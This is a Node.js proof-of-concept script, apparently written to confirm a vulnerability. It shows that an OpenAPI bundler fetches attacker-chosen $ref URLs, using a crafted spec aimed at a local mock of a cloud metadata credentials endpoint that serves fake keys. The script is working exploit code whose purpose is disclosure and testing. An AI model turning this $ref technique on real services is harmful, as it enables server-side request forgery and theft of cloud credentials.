/**
 * PoC: SSRF via unrestricted $ref fetch in loadAndBundleSpec (H6)
 *
 * Affected code: src/utils/loadAndBundleSpec.ts:22-24, :37
 * Sink:          @acmely/openapi-core readFileFromUrl() -> node-fetch(url) (Node path)
 *                @acmely/openapi-core readFileFromUrl() -> config.customFetch(url) = global.fetch (browser path)
 *
 * Exploit path:
 *   1. Attacker supplies (or influences) an OpenAPI spec containing an absolute-URL $ref.
 *   2. loadAndBundleSpec() passes the spec object to bundle() with NO URL filtering.
 *   3. The bundler walks every $ref and calls readFileFromUrl(url) via node-fetch (Node)
 *      or global.fetch (browser), causing the host process to make an outbound HTTP
 *      request to an arbitrary attacker-chosen target — SSRF.
 *   4. The full response body is inlined into the bundled spec (read-out SSRF, not blind).
 *
 * This PoC simulates an internal service (e.g. cloud metadata endpoint, internal API)
 * via a local HTTP server and demonstrates that the bundler contacts it and returns the
 * response body to the caller — full read-out SSRF.
 *
 * Usage: node poc.js
 */

'use strict';

const http = require('http');
const path = require('path');

// --- resolve project root so we can load acme's own deps -----------------
const PROJECT_ROOT = path.resolve(__dirname, '..', '..', '..', '..');

// Patch module resolution to use acme's node_modules
process.chdir(PROJECT_ROOT);

const { bundle } = require('@acmely/openapi-core/lib/bundle');
const { Config } = require('@acmely/openapi-core/lib/config/config');

// --------------------------------------------------------------------------
// Step 1 — spin up a mock "internal service" (simulate cloud metadata API,
//           internal admin endpoint, etc.)
// --------------------------------------------------------------------------
const INTERNAL_PORT = 19254;
const INTERNAL_PATH = '/latest/meta-data/iam/security-credentials/ec2-default';

// Simulated AWS-style credential response
const FAKE_CRED_RESPONSE = JSON.stringify({
  Code: 'Success',
  Type: 'AWS-HMAC',
  AccessKeyId: 'ASIAFAKEKEY00000SSRF',
  SecretAccessKey: 'FakeSecretKey/SSRF_PROOF_OF_CONCEPT_00000',
  Token: 'FakeSessionToken_SSRF_POC',
  Expiration: '2099-01-01T00:00:00Z',
});

let requestsReceived = [];

const internalServer = http.createServer((req, res) => {
  const record = {
    method: req.method,
    url: req.url,
    headers: req.headers,
    time: new Date().toISOString(),
  };
  requestsReceived.push(record);
  console.log(`[internal-server] INCOMING REQUEST: ${req.method} ${req.url}`);
  console.log(`[internal-server] From: ${req.headers['host']}`);
  res.setHeader('Content-Type', 'application/json');
  res.end(FAKE_CRED_RESPONSE);
});

// --------------------------------------------------------------------------
// Step 2 — craft attacker-controlled OpenAPI spec with $ref pointing at the
//           "internal service" — any absolute http:// $ref works.
// --------------------------------------------------------------------------
function buildMaliciousSpec(targetUrl) {
  return {
    openapi: '3.0.0',
    info: { title: 'Attacker-Controlled Spec', version: '1.0.0' },
    paths: {
      '/exfil': {
        get: {
          summary: 'Exfil endpoint',
          responses: {
            '200': {
              description: 'ok',
              content: {
                'application/json': {
                  // $ref here causes the bundler to fetch targetUrl unconditionally
                  schema: { $ref: targetUrl },
                },
              },
            },
          },
        },
      },
    },
  };
}

// --------------------------------------------------------------------------
// Step 3 — reproduce the acme Node path: same call loadAndBundleSpec makes
// --------------------------------------------------------------------------
async function simulateLoadAndBundleSpec(specObject) {
  const config = new Config({});
  const bundleOpts = {
    config,
    base: process.cwd(),
    // IS_BROWSER is false in Node, so customFetch is NOT set here —
    // proving the Node path is also vulnerable (uses node-fetch with no filter)
    doc: {
      source: { absoluteRef: '' },
      parsed: specObject,
    },
  };
  const result = await bundle(bundleOpts);
  return result.bundle.parsed;
}

// --------------------------------------------------------------------------
// Main
// --------------------------------------------------------------------------
async function main() {
  await new Promise((resolve) => internalServer.listen(INTERNAL_PORT, '127.0.0.1', resolve));

  const targetUrl = `http://127.0.0.1:${INTERNAL_PORT}${INTERNAL_PATH}`;
  console.log(`[poc] Internal service listening at ${targetUrl}`);
  console.log(`[poc] Building attacker-controlled spec with $ref: "${targetUrl}"`);

  const maliciousSpec = buildMaliciousSpec(targetUrl);

  let bundledSpec = null;
  let ssrfError = null;

  try {
    bundledSpec = await simulateLoadAndBundleSpec(maliciousSpec);
  } catch (err) {
    // Partial bundling errors are acceptable — the HTTP request still fired
    ssrfError = err.message;
    console.log(`[poc] bundle() threw (expected if schema parse failed): ${ssrfError}`);
  }

  await internalServer.close();

  // --------------------------------------------------------------------------
  // Evaluate results
  // --------------------------------------------------------------------------
  const hit = requestsReceived.find((r) => r.url === INTERNAL_PATH);

  console.log('\n=== SSRF Evidence ===');
  if (hit) {
    console.log(`[poc] Internal server received request: ${hit.method} ${hit.url}`);
    console.log(`[poc] Request time: ${hit.time}`);
  }

  // Check if response body was inlined into the bundled spec (read-out SSRF)
  let inlinedResponse = null;
  if (bundledSpec) {
    const schema =
      bundledSpec?.paths?.['/exfil']?.get?.responses?.['200']?.content?.['application/json']?.schema;
    if (schema && schema.AccessKeyId) {
      inlinedResponse = schema.AccessKeyId;
      console.log(`[poc] SSRF response INLINED into bundled spec!`);
      console.log(`[poc] Exfiltrated AccessKeyId: ${schema.AccessKeyId}`);
      console.log(`[poc] Exfiltrated SecretAccessKey: ${schema.SecretAccessKey}`);
    }
  }

  const confirmed = hit !== null && hit !== undefined;
  const evidence = confirmed
    ? inlinedResponse
      ? `internal-server received GET ${INTERNAL_PATH}; response body inlined into bundled spec (AccessKeyId=${inlinedResponse})`
      : `internal-server received GET ${INTERNAL_PATH} — HTTP request emitted to attacker-specified $ref URL with no allow-list check`
    : 'no request received — SSRF not triggered';

  // REQUIRED: last stdout line must be this JSON object
  console.log(
    JSON.stringify({
      status: confirmed ? 'confirmed' : 'failed',
      evidence,
      notes:
        'Node path: loadAndBundleSpec -> bundle() -> BaseResolver -> readFileFromUrl() -> node-fetch(url) with no scheme/host filter. Browser path additionally sets config.resolve.http.customFetch = global.fetch with the same absence of filtering.',
    }),
  );
}

main().catch((err) => {
  console.error('[poc] Fatal:', err);
  console.log(
    JSON.stringify({
      status: 'failed',
      evidence: `exception: ${err.message}`,
      notes: 'PoC execution failed',
    }),
  );
  process.exit(1);
});
